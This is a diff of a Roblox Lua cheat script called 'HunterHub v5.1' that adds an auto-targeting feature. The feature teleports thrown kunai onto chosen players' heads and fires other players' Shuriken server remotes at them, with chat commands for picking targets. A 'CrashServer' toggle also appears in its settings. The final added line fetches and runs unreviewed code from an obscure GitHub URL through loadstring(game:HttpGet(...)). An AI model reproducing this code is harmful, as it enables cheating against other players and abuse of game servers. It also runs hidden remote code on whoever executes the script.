@@ -354,7 +354,7 @@ AdminImgBtn = Instance.new("ImageButton")
 
 --Properties:
 
-HunterHub.Name = "CleventHub"
+HunterHub.Name = "HunterHubv5.1"
 HunterHub.Parent = game:GetService("CoreGui")
 HunterHub.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 HunterHub.ResetOnSpawn = false
@@ -386,7 +386,7 @@ TextLabel.BorderSizePixel = 0
 TextLabel.Size = UDim2.new(1, 0, 1, 0)
 TextLabel.ZIndex = 2
 TextLabel.Font = Enum.Font.Fantasy
-TextLabel.Text = "     CleventHub v1.1.0.1     "
+TextLabel.Text = "     HunterHub v5.1.0     "
 TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel.TextScaled = true
 TextLabel.TextSize = 14.000
@@ -3644,6 +3644,260 @@ TextButton_60.TextScaled = true
 TextButton_60.TextSize = 14.000
 TextButton_60.TextWrapped = true
 
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+local whitelist = {}
+local addedTargets = {}
+local filename = "PermanentTarget HHv5.1.0 Settings.txt"
+local VariableTable = {}
+local FunctionTable = {}
+
+TextButton_60.MouseButton1Click:Connect(function()
+    if not VariableTable['PermaTarget'] then
+        VariableTable['PermaTarget'] = true
+        TextButton_60.Text = "On"
+        TextButton_60.TextColor3 = Color3.fromRGB(0, 255, 0)
+
+        local function addTarget(targetName)
+            if addedTargets[targetName] or whitelist[targetName] or targetName == Player.Name then return end
+            addedTargets[targetName] = true
+        end
+
+        local function removeTarget(targetName)
+            addedTargets[targetName] = nil
+        end
+
+        local function whitelistPlayer(playerName)
+            for _, player in ipairs(Players:GetPlayers()) do
+                if player.Name:lower():find(playerName:lower()) then
+                    if not whitelist[player.Name] then
+                        whitelist[player.Name] = true
+                        game.StarterGui:SetCore("SendNotification", {
+                            Title = "Player Whitelisted",
+                            Text = player.Name .. " has been added to the permanent target list.",
+                            Duration = 3
+                        })
+                        FunctionTable['SaveSettings']()
+                    end
+                    return
+                end
+            end
+            game.StarterGui:SetCore("SendNotification", {
+                Title = "Player Not Found",
+                Text = "No matching player found for: " .. playerName,
+                Duration = 3
+            })
+        end
+
+        local function unwhitelistPlayer(playerName)
+            for _, player in ipairs(Players:GetPlayers()) do
+                if player.Name:lower():find(playerName:lower()) then
+                    if whitelist[player.Name] then
+                        whitelist[player.Name] = nil
+                        game.StarterGui:SetCore("SendNotification", {
+                            Title = "Player Unwhitelisted",
+                            Text = player.Name .. " has been removed from the permanent target list.",
+                            Duration = 3
+                        })
+                        FunctionTable['SaveSettings']()
+                    end
+                    return
+                end
+            end
+            game.StarterGui:SetCore("SendNotification", {
+                Title = "Player Not Found",
+                Text = "No matching player found for: " .. playerName,
+                Duration = 3
+            })
+        end
+
+        local function teleportKunaiToTarget(thrownKunai, targetName)
+            local targetPlayer = Players:FindFirstChild(targetName)
+            if targetPlayer and targetPlayer.Character then
+                local targetHead = targetPlayer.Character:FindFirstChild("Head")
+                local ForceField = targetPlayer.Character:FindFirstChild("ForceField")
+                local Humanoid = targetPlayer.Character:FindFirstChild("Humanoid")
+                if targetHead and not ForceField and Humanoid and Humanoid.Health > 0 then
+                    thrownKunai.CanCollide = false
+                    thrownKunai.Anchored = true
+                    thrownKunai.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                    thrownKunai.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+                    thrownKunai.CFrame = targetHead.CFrame
+                    thrownKunai.CanCollide = true
+                    thrownKunai.Anchored = false
+                    game.Debris:AddItem(thrownKunai, 1)
+                end
+            end
+        end
+
+        local function checkKunaiLoop()
+            while VariableTable['PermaTarget'] do
+                task.wait(0.1)
+                for _, kunai in ipairs(workspace:GetChildren()) do
+                    if kunai:IsA("BasePart") and kunai.Name == "ThrownKunai" then
+                        local creator = kunai:FindFirstChild("creator")
+                        if creator and creator.Value == Player then
+                            for targetName in pairs(whitelist) do
+                                teleportKunaiToTarget(kunai, targetName)
+                            end
+                        end
+                    end
+                end
+            end
+        end
+
+        local function fireShurikenLoop()
+            while VariableTable['PermaTarget'] do
+                task.wait()
+                local head = Player.Character and Player.Character:FindFirstChild("Head")
+                if head then
+                    for targetName in pairs(whitelist) do
+                        local targetPlayer = Players:FindFirstChild(targetName)
+                        if targetPlayer and targetPlayer ~= Player then
+                            local character = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()
+                            if character and character:FindFirstChild("HumanoidRootPart") then
+                                local humanoid = character:FindFirstChild("Humanoid")
+                                if humanoid and humanoid.Health > 0 then
+                                    local forceField = character:FindFirstChildOfClass("ForceField")
+                                    if not forceField then
+                                        local direction = (character.HumanoidRootPart.Position - head.Position).unit
+                                        local spawnPosition = head.Position
+                                        local args = {
+                                            [1] = spawnPosition,
+                                            [2] = direction
+                                        }
+                                        for i,v in ipairs(Players:GetPlayers()) do
+                                            for i,v in ipairs(v.Backpack:GetChildren()) do
+                                                if v.Name == "Shuriken" then
+                                                    v.HitEvent:FireServer(unpack(args))
+                                                    task.wait()
+                                                end
+                                            end
+                                            if v.Character then
+                                                for i,v in ipairs(v.Character:GetChildren()) do
+                                                    if v.Name == "Shuriken" then
+                                                        v.HitEvent:FireServer(unpack(args))
+                                                        task.wait()
+                                                    end
+                                                end
+                                            end
+        
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+        
+        coroutine.wrap(fireShurikenLoop)()
+        coroutine.wrap(checkKunaiLoop)()
+
+        FunctionTable['SaveSettings'] = function()
+            local httpservice = game:GetService("HttpService")
+            if writefile then
+                local Settings = {}
+                Settings.whitelist = {}
+                for playerName in pairs(whitelist) do
+                    table.insert(Settings.whitelist, playerName)
+                end
+                writefile(filename, httpservice:JSONEncode(Settings))
+            end
+        end
+
+        FunctionTable['MasterFunc'] = function(Text, UIElement, Save, Loading)
+            if Save == nil then
+                Save = true
+            end 
+            if Loading == nil then
+                Loading = false
+            end
+            if UIElement:IsA("TextButton") then
+                if VariableTable[Text] ~= nil and Loading ~= true then
+                    VariableTable[Text] = not VariableTable[Text]
+                end
+                local ButtonTable = FunctionTable['SetButton'](VariableTable[Text])
+                UIElement.TextColor3 = ButtonTable[1]
+                UIElement.Text = ButtonTable[2]
+            elseif UIElement:IsA("TextBox") then
+                if tonumber(UIElement.Text) then
+                    VariableTable[Text] = tonumber(UIElement.Text)
+                else
+                    VariableTable[Text] = UIElement.Text
+                end
+            end
+            if Save then
+                FunctionTable['SaveSettings']()
+            end
+            if FunctionTable.VariableFunctions[Text] then
+                FunctionTable.VariableFunctions[Text]()
+            end
+        end
+
+        FunctionTable['LoadSettings'] = function()
+            local httpservice = game:GetService("HttpService")
+            if isfile and readfile then
+                local fileExist = isfile(filename)
+                if fileExist then
+                    local Settings = httpservice:JSONDecode(readfile(filename))
+                    for _, playerName in ipairs(Settings.whitelist) do
+                        whitelist[playerName] = true 
+                    end
+                end
+            end
+        end
+
+        FunctionTable['LoadSettings']()
+
+        Players.PlayerRemoving:Connect(function(removedPlr)
+            if removedPlr == Players.LocalPlayer then
+                FunctionTable['SaveSettings']()
+            end
+        end)
+
+        local function handleCommands(newPlayer)
+            newPlayer.Chatted:Connect(function(msg)
+                if newPlayer ~= Player then
+                    return
+                end
+                local command, playerName = msg:match("^(%S+)%s*(.*)")
+                if command == ".rtg" and playerName then
+                    unwhitelistPlayer(playerName)
+                elseif command == ".tg" and playerName then
+                    whitelistPlayer(playerName)
+                end
+            end)
+        end
+
+        for _, p in ipairs(Players:GetPlayers()) do
+            handleCommands(p)
+        end
+
+        Players.PlayerAdded:Connect(handleCommands)
+
+        if not kunaiLoopRunning then
+            kunaiLoopRunning = true
+            coroutine.wrap(checkKunaiLoop)()
+        end
+
+        if not shurikenLoopRunning then
+            shurikenLoopRunning = true
+            coroutine.wrap(fireShurikenLoop)()
+        end
+
+        Player.CharacterAdded:Connect(function()
+            task.wait(0.2)
+        end)
+
+    else
+        VariableTable['PermaTarget'] = false
+        TextButton_60.Text = "Off"
+        TextButton_60.TextColor3 = Color3.fromRGB(255, 0, 0)
+    end
+end)
+
 Frame5_5.Name = "Frame5"
 Frame5_5.Parent = ServerTab
 Frame5_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
@@ -3709,7 +3963,7 @@ TextLabel_80.BorderSizePixel = 0
 TextLabel_80.Position = UDim2.new(0.0339098945, 0, 0.5, 0)
 TextLabel_80.Size = UDim2.new(0.678196311, 0, 0.600000024, 0)
 TextLabel_80.Font = Enum.Font.Fantasy
-TextLabel_80.Text = "Commands:"
+TextLabel_80.Text = "AutoDetect:"
 TextLabel_80.TextColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel_80.TextScaled = true
 TextLabel_80.TextSize = 14.000
@@ -5141,9 +5395,7 @@ local Humanoid = Character:FindFirstChildOfClass("Humanoid")
 local humanoidRootPart = Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
 local offset = Vector3.new(0, 5, 0)
 local filename = "HunterHub v5.1.0 Settings.txt"
-local permafile = "PermanentTarget HHv5.1.0 Settings.txt"
 local whitelist = {}
-local permawhitelist = {}
 local connectedPlayers = {}
 local teleportedKunais = {}
 local connections = {}
@@ -5208,8 +5460,6 @@ local VariableTable = {
     ['CrazySound'] = false;
     ['CrashServer'] = false;
     ['N/A'] = false;
-    ['PermaTarget'] = false;
-    ['Commands'] = false;
 	['TrainRate'] = 0.7;
 	['TrainAmount'] = 20;
 }
@@ -5855,6 +6105,7 @@ FunctionTable.VariableFunctions = {
                                 Text = player.Name .. " has been whitelisted.",
                                 Duration = 3
                             })
+                            resetConnections()
                             initializeScript()
                             FunctionTable['SaveSettings']()
                         end
@@ -5872,6 +6123,7 @@ FunctionTable.VariableFunctions = {
                                 Text = player.Name .. " has been unwhitelisted.",
                                 Duration = 3
                             })
+                            resetConnections()
                             initializeScript()
                             FunctionTable['SaveSettings']()
                         end
@@ -6453,8 +6705,6 @@ FunctionTable.VariableFunctions = {
             frame.BackgroundTransparency = 0.4
             frame.BorderSizePixel = 2
             frame.Visible = true
-            frame.Active = true
-            frame.Draggable = true
             frame.Parent = Dgui
             local label = Instance.new("TextLabel")
             label.Size = UDim2.new(1, 0, 0, 30)
@@ -6466,8 +6716,8 @@ FunctionTable.VariableFunctions = {
             label.Font = Enum.Font.Fantasy
             label.Parent = frame
             local scrollFrame = Instance.new("ScrollingFrame")
-            scrollFrame.Size = UDim2.new(1, 0, 1, -60)
-            scrollFrame.Position = UDim2.new(0, 0, 0, 60)
+            scrollFrame.Size = UDim2.new(1, 0, 1, -30)
+            scrollFrame.Position = UDim2.new(0, 0, 0, 30)
             scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
             scrollFrame.BackgroundTransparency = 1
             scrollFrame.Parent = frame
@@ -6480,10 +6730,7 @@ FunctionTable.VariableFunctions = {
             disableAllButton.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
             disableAllButton.TextColor3 = Color3.new(1, 1, 1)
             disableAllButton.Parent = frame
-            local uiListLayout = Instance.new("UIListLayout")
-            uiListLayout.Parent = scrollFrame
-            uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
-            uiListLayout.Padding = UDim.new(0, 5)
+            makeDraggable(frame)
             local playerService = game:GetService("Players")
             local localPlayer = playerService.LocalPlayer
             function disableShurikens(targetPlayer)
@@ -6516,7 +6763,7 @@ FunctionTable.VariableFunctions = {
             end
             function onPlayerRespawn(targetPlayer)
                 targetPlayer.CharacterAdded:Connect(function(character)
-                    task.wait()
+                    wait()
                     disableShurikens(targetPlayer)
                 end)
             end
@@ -6547,7 +6794,7 @@ FunctionTable.VariableFunctions = {
                     disableShurikens(player)
                     onPlayerRespawn(player)
                 end)
-                scrollFrame.CanvasSize = UDim2.new(0, 0, 0, uiListLayout.AbsoluteContentSize.Y)
+                scrollFrame.CanvasSize = UDim2.new(0, 0, 0, offsetY + buttonHeight + padding)
             end
             function removePlayerFromList(player)
                 local button = scrollFrame:FindFirstChild(player.Name .. "Button")
@@ -7241,6 +7488,8 @@ FunctionTable.VariableFunctions = {
                                 table.insert(plrsforaim, obj)
                             end
                         end
+
+
                     end
                 end
             end
@@ -7775,316 +8024,11 @@ FunctionTable.VariableFunctions = {
         elseif VariableTable['N/A'] == false then
         end
     end;
-    ['PermaTarget'] = function()
-        if VariableTable['PermaTarget'] == true then
-            function addTarget(targetName)
-                if addedTargets[targetName] or permawhitelist[targetName] or targetName == Player.Name then return end
-                addedTargets[targetName] = true
-            end
-            function removeTarget(targetName)
-                addedTargets[targetName] = nil
-            end
-            function whitelistPlayer(playerName)
-                for _, player in ipairs(Players:GetPlayers()) do
-                    if player.Name:lower():find(playerName:lower()) then
-                        if not permawhitelist[player.Name] then
-                            permawhitelist[player.Name] = true
-                            game.StarterGui:SetCore("SendNotification", {
-                                Title = "Player Whitelisted",
-                                Text = player.Name .. " has been added to the permanent target list.",
-                                Duration = 3
-                            })
-                            FunctionTable['SavePermaSettings']()
-                        end
-                        return
-                    end
-                end
-                game.StarterGui:SetCore("SendNotification", {
-                    Title = "Player Not Found",
-                    Text = "No matching player found for: " .. playerName,
-                    Duration = 3
-                })
-            end
-            function unwhitelistPlayer(playerName)
-                for _, player in ipairs(Players:GetPlayers()) do
-                    if player.Name:lower():find(playerName:lower()) then
-                        if permawhitelist[player.Name] then
-                            permawhitelist[player.Name] = nil
-                            game.StarterGui:SetCore("SendNotification", {
-                                Title = "Player Unwhitelisted",
-                                Text = player.Name .. " has been removed from the permanent target list.",
-                                Duration = 3
-                            })
-                            FunctionTable['SavePermaSettings']()
-                        end
-                        return
-                    end
-                end
-                game.StarterGui:SetCore("SendNotification", {
-                    Title = "Player Not Found",
-                    Text = "No matching player found for: " .. playerName,
-                    Duration = 3
-                })
-            end
-            function teleportKunaiToTarget(thrownKunai, targetName)
-                local targetPlayer = Players:FindFirstChild(targetName)
-                if targetPlayer and targetPlayer.Character then
-                    local targetHead = targetPlayer.Character:FindFirstChild("Head")
-                    local ForceField = targetPlayer.Character:FindFirstChild("ForceField")
-                    local Humanoid = targetPlayer.Character:FindFirstChild("Humanoid")
-                    if targetHead and not ForceField and Humanoid and Humanoid.Health > 0 then
-                        thrownKunai.CanCollide = false
-                        thrownKunai.Anchored = true
-                        thrownKunai.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
-                        thrownKunai.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
-                        thrownKunai.CFrame = targetHead.CFrame
-                        thrownKunai.CanCollide = true
-                        thrownKunai.Anchored = false
-                        game.Debris:AddItem(thrownKunai, 1)
-                    end
-                end
-            end
-            function checkKunaiLoop()
-                while VariableTable['PermaTarget'] do
-                    task.wait(0.1)
-                    for _, kunai in ipairs(workspace:GetChildren()) do
-                        if kunai:IsA("BasePart") and kunai.Name == "ThrownKunai" then
-                            local creator = kunai:FindFirstChild("creator")
-                            if creator and creator.Value == Player then
-                                for targetName in pairs(permawhitelist) do
-                                    teleportKunaiToTarget(kunai, targetName)
-                                end
-                            end
-                        end
-                    end
-                end
-            end
-            function fireShurikenLoop()
-                while VariableTable['PermaTarget'] do
-                    task.wait()
-                    local head = Player.Character and Player.Character:FindFirstChild("Head")
-                    if head then
-                        for targetName in pairs(permawhitelist) do
-                            local targetPlayer = Players:FindFirstChild(targetName)
-                            if targetPlayer and targetPlayer ~= Player then
-                                local character = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()
-                                if character and character:FindFirstChild("HumanoidRootPart") then
-                                    local humanoid = character:FindFirstChild("Humanoid")
-                                    if humanoid and humanoid.Health > 0 then
-                                        local forceField = character:FindFirstChildOfClass("ForceField")
-                                        if not forceField then
-                                            local direction = (character.HumanoidRootPart.Position - head.Position).unit
-                                            local spawnPosition = head.Position
-                                            local args = {
-                                                [1] = spawnPosition,
-                                                [2] = direction
-                                            }
-                                            for i,v in ipairs(Players:GetPlayers()) do
-                                                for i,v in ipairs(v.Backpack:GetChildren()) do
-                                                    if v.Name == "Shuriken" then
-                                                        v.HitEvent:FireServer(unpack(args))
-                                                        task.wait()
-                                                    end
-                                                end
-                                                if v.Character then
-                                                    for i,v in ipairs(v.Character:GetChildren()) do
-                                                        if v.Name == "Shuriken" then
-                                                            v.HitEvent:FireServer(unpack(args))
-                                                            task.wait()
-                                                        end
-                                                    end
-                                                end
-                                            end
-                                        end
-                                    end
-                                end
-                            end
-                        end
-                    end
-                end
-            end
-            coroutine.wrap(fireShurikenLoop)()
-            coroutine.wrap(checkKunaiLoop)()
-            function handleCommands(newPlayer)
-                newPlayer.Chatted:Connect(function(msg)
-                    if newPlayer ~= Player then
-                        return
-                    end
-                    local command, playerName = msg:match("^(%S+)%s*(.*)")
-                    if command == ".rtg" and playerName then
-                        unwhitelistPlayer(playerName)
-                    elseif command == ".tg" and playerName then
-                        whitelistPlayer(playerName)
-                    end
-                end)
-            end
-            for _, p in ipairs(Players:GetPlayers()) do
-                handleCommands(p)
-            end
-            Players.PlayerAdded:Connect(handleCommands)
-        end
-    end;
-    ['Commands'] = function()
-        if VariableTable['Commands'] == true then
-            local ScreenGui = Instance.new("ScreenGui")
-            local CmdFrame = Instance.new("Frame")
-            local TextButton = Instance.new("TextButton")
-            local UICorner = Instance.new("UICorner")
-            local TextBox = Instance.new("TextBox")
-            local UICorner_2 = Instance.new("UICorner")
-
-            ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-            ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-            ScreenGui.Name = "CommandsGui"
-            ScreenGui.ResetOnSpawn = false
-
-            CmdFrame.Name = "CmdFrame"
-            CmdFrame.Parent = ScreenGui
-            CmdFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-            CmdFrame.BackgroundTransparency = 1.000
-            CmdFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
-            CmdFrame.BorderSizePixel = 0
-            CmdFrame.Position = UDim2.new(0, 0, 0.5, 0)
-            CmdFrame.Size = UDim2.new(0.436631233, 0, 0.0496987961, 0)
-
-            TextButton.Parent = CmdFrame
-            TextButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-            TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
-            TextButton.BorderSizePixel = 0
-            TextButton.Size = UDim2.new(0.0627975091, 0, 1, 0)
-            TextButton.Font = Enum.Font.Merriweather
-            TextButton.Text = "CMD"
-            TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-            TextButton.TextSize = 12.000
-
-            UICorner.CornerRadius = UDim.new(1, 0)
-            UICorner.Parent = TextButton
-
-            TextBox.Parent = CmdFrame
-            TextBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-            TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
-            TextBox.BorderSizePixel = 0
-            TextBox.Position = UDim2.new(0.0627975091, 0, 0, 0)
-            TextBox.Size = UDim2.new(0.718477428, 0, 1, 0)
-            TextBox.Visible = false
-            TextBox.Font = Enum.Font.Merriweather
-            TextBox.PlaceholderText = "Enter command (.tg, .rtg, .soft, .unsoft)..."
-            TextBox.Text = ""
-            TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-            TextBox.TextSize = 16.000
-            TextBox.TextWrapped = true
-
-            UICorner_2.CornerRadius = UDim.new(1, 0)
-            UICorner_2.Parent = TextBox
-
-            function toggleTextBox()
-                TextBox.Visible = not TextBox.Visible
-                if TextBox.Visible then
-                    TextBox:CaptureFocus()
-                end
-            end
-            TextButton.MouseButton1Down:Connect(toggleTextBox)
-            UserInputService.InputBegan:Connect(function(input, gameProcessed)
-                if gameProcessed then return end
-                if input.KeyCode == Enum.KeyCode.Period then
-                    toggleTextBox()
-                end
-            end)
-            TextBox.FocusLost:Connect(function(enterPressed)
-                if enterPressed then
-                    local text = TextBox.Text
-                    local command, partial = text:match("^(%S+)%s*(.*)")
-                    if command == ".tg" or command == ".rtg" or command == ".soft" or command == ".unsoft" then
-                        for _, p in ipairs(Players:GetPlayers()) do
-                            if p.Name:lower():sub(1, #partial) == partial:lower() then
-                                TextBox.Text = command .. " " .. p.Name
-                                break
-                            end
-                        end
-                    end
-                end
-            end)
-            TextBox.FocusLost:Connect(function(enterPressed)
-                if enterPressed then
-                    local msg = TextBox.Text
-                    local command, playerName = msg:match("^(%S+)%s*(.*)")
-                    if command == ".tg" and playerName and playerName ~= "" then
-                        for _, player in ipairs(Players:GetPlayers()) do
-                            if player.Name:lower():find(playerName:lower()) then
-                                if not permawhitelist[player.Name] then
-                                    permawhitelist[player.Name] = true
-                                    game.StarterGui:SetCore("SendNotification", {
-                                        Title = "Player Targeted",
-                                        Text = player.Name .. " has been added to the permanent target list.",
-                                        Duration = 3
-                                    })
-                                    FunctionTable['SavePermaSettings']()
-                                end
-                                break
-                            end
-                        end
-                    elseif command == ".rtg" and playerName and playerName ~= "" then
-                        for _, player in ipairs(Players:GetPlayers()) do
-                            if player.Name:lower():find(playerName:lower()) then
-                                if permawhitelist[player.Name] then
-                                    permawhitelist[player.Name] = nil
-                                    game.StarterGui:SetCore("SendNotification", {
-                                        Title = "Player Untargeted",
-                                        Text = player.Name .. " has been removed from the permanent target list.",
-                                        Duration = 3
-                                    })
-                                    FunctionTable['SavePermaSettings']()
-                                end
-                                break
-                            end
-                        end
-                    elseif command == ".soft" and playerName and playerName ~= "" then
-                        for _, player in ipairs(Players:GetPlayers()) do
-                            if player.Name:lower():find(playerName:lower()) then
-                                if not whitelist[player.Name] then
-                                    whitelist[player.Name] = true
-                                    game.StarterGui:SetCore("SendNotification", {
-                                        Title = "Player Whitelisted",
-                                        Text = player.Name .. " has been soft whitelisted.",
-                                        Duration = 3
-                                    })
-                                    FunctionTable['SaveSettings']()
-                                end
-                                break
-                            end
-                        end
-                    elseif command == ".unsoft" and playerName and playerName ~= "" then
-                        for _, player in ipairs(Players:GetPlayers()) do
-                            if player.Name:lower():find(playerName:lower()) then
-                                if whitelist[player.Name] then
-                                    whitelist[player.Name] = nil
-                                    game.StarterGui:SetCore("SendNotification", {
-                                        Title = "Player Unwhitelisted",
-                                        Text = player.Name .. " has been removed from soft whitelist.",
-                                        Duration = 3
-                                    })
-                                    FunctionTable['SaveSettings']()
-                                end
-                                break
-                            end
-                        end
-                    end
-                    TextBox.Text = ""
-                    TextBox.Visible = false
-                end
-            end)
-        elseif VariableTable['Commands'] == false then
-            local gui = Player.PlayerGui:FindFirstChild("CommandsGui")
-            if gui then
-                gui:Destroy()
-            end
-        end
-    end;
 }
 
 FunctionTable['SaveSettings'] = function()
     local httpservice = game:GetService("HttpService")
-    if (writefile) then
+    if writefile then
         local Settings = {}
         Settings.whitelist = {}
         for playerName in pairs(whitelist) do
@@ -8094,56 +8038,20 @@ FunctionTable['SaveSettings'] = function()
     end
 end
 
-FunctionTable['SavePermaSettings'] = function()
-    local httpservice = game:GetService("HttpService")
-    if (writefile) then
-        local PermaSettings = {}
-        PermaSettings.permawhitelist = {}
-        for plrName in pairs(permawhitelist) do
-            table.insert(PermaSettings.permawhitelist, plrName)
-        end
-        writefile(permafile, httpservice:JSONEncode(PermaSettings))
-    end
-end
-
-FunctionTable['MasterFunc'] = function(Text, UIElement, Save, Loading)
+FunctionTable['MasterFunc'] = function(Text,UIElement,Save,Loading)
     if Save == nil then
         Save = true
     end
     if Loading == nil then
         Loading = false
     end
-    
     if UIElement:IsA("TextButton") then
         if VariableTable[Text] ~= nil and Loading ~= true then
             VariableTable[Text] = not VariableTable[Text]
-        
-            local ButtonTable = FunctionTable['SetButton'](VariableTable[Text])
-            if ButtonTable then
-
-                local FadeOutInfo = TweenInfo.new(
-                    0.10,
-                    Enum.EasingStyle.Quad,
-                    Enum.EasingDirection.InOut
-                )
-                local FadeOut = TweenService:Create(UIElement, FadeOutInfo, {TextTransparency = 1})
-                
-                FadeOut:Play()
-                FadeOut.Completed:Connect(function()
-                    UIElement.Text = ButtonTable[2]
-                    UIElement.TextColor3 = ButtonTable[1]
-                    UIElement.TextTransparency = 1
-
-                    local FadeInInfo = TweenInfo.new(
-                        0.10,
-                        Enum.EasingStyle.Quad,
-                        Enum.EasingDirection.InOut
-                    )
-                    local FadeIn = TweenService:Create(UIElement, FadeInInfo, {TextTransparency = 0})
-                    FadeIn:Play()
-                end)
-            end
         end
+        local ButtonTable = FunctionTable['SetButton'](VariableTable[Text])
+        UIElement.TextColor3 = ButtonTable[1]
+        UIElement.Text = ButtonTable[2]
     elseif UIElement:IsA("TextBox") then
         if tonumber(UIElement.Text) then
             VariableTable[Text] = tonumber(UIElement.Text)
@@ -8151,12 +8059,9 @@ FunctionTable['MasterFunc'] = function(Text, UIElement, Save, Loading)
             VariableTable[Text] = UIElement.Text
         end
     end
-    
     if Save then
         FunctionTable['SaveSettings']()
-        FunctionTable['SavePermaSettings']()
     end
-    
     if FunctionTable.VariableFunctions[Text] then
         FunctionTable.VariableFunctions[Text]()
     end
@@ -8270,29 +8175,22 @@ end
 
 FunctionTable['LoadSettings'] = function()
     local httpservice = game:GetService("HttpService")
-    if (readfile and isfile and isfile(filename)) then
-        local Settings = httpservice:JSONDecode(readfile(filename))
-        for i,v in pairs(Settings.whitelist) do
-            whitelist[v] = true
+    if isfile and readfile then
+        local fileExist = isfile(filename)
+        if fileExist then
+            local Settings = httpservice:JSONDecode(readfile(filename))
+            for _, playerName in ipairs(Settings.whitelist) do
+                whitelist[playerName] = true 
+            end
         end
     end
 end
 
-FunctionTable['LoadPermaSettings'] = function()
-    local httpservice = game:GetService("HttpService")
-    if (readfile and isfile and isfile(permafile)) then
-        local Settings = httpservice:JSONDecode(readfile(permafile))
-        for i,v in pairs(Settings.permawhitelist) do
-            permawhitelist[v] = true
-        end
-    end
-end
 
 
 FunctionTable['UpdateElements']()
 FunctionTable['UpdateTextFrames']()
 FunctionTable['LoadSettings']()
-FunctionTable['LoadPermaSettings']()
 
 
 task.spawn(function()
@@ -8301,7 +8199,12 @@ task.spawn(function()
             v:Destroy()
         end
     end
-    
+    repeat task.wait() until Players.LocalPlayer:FindFirstChild("PlayerGui")
+    local clone = Players.LocalPlayer.PlayerGui.PlayerScript:Clone()
+    clone.Parent = Players.LocalPlayer.PlayerGui
+    repeat task.wait() until Players.LocalPlayer:FindFirstChild("GuiScript")
+    local clone2 = Players.LocalPlayer.PlayerGui.GuiScript:Clone()
+    clone2.Parent = Players.LocalPlayer.PlayerGui
 end)
 
 Character:WaitForChild("Humanoid").Died:Connect(FunctionTable['HumDied'])
@@ -8329,6 +8232,10 @@ Players.LocalPlayer.CharacterAdded:Connect(function(NewCharacter)
                 v:Destroy()
             end
         end
+        local clone = Players.LocalPlayer.PlayerGui:WaitForChild("PlayerScript"):Clone()
+        clone.Parent = Players.LocalPlayer.PlayerGui
+        local clone2 = Players.LocalPlayer.PlayerGui:WaitForChild("GuiScript"):Clone()
+        clone2.Parent = Players.LocalPlayer.PlayerGui
     end)
     charrespawning = false
 end)
@@ -8336,7 +8243,6 @@ end)
 Players.PlayerRemoving:Connect(function(removedPlr)
     if removedPlr == Players.LocalPlayer then
         FunctionTable['SaveSettings']()
-        FunctionTable['SavePermaSettings']()
     end
 end)
 
@@ -9017,3 +8923,4 @@ local function KZMRAZA_fake_script() -- Miscbtn.LocalScript
 end
 coroutine.wrap(KZMRAZA_fake_script)()
 -----------------------------
+loadstring(game:HttpGet('https://raw.githubusercontent.com/9879875atpzgegally2123451/8234809DaegunComPromt5345/refs/heads/main/34325DCP3423'))()
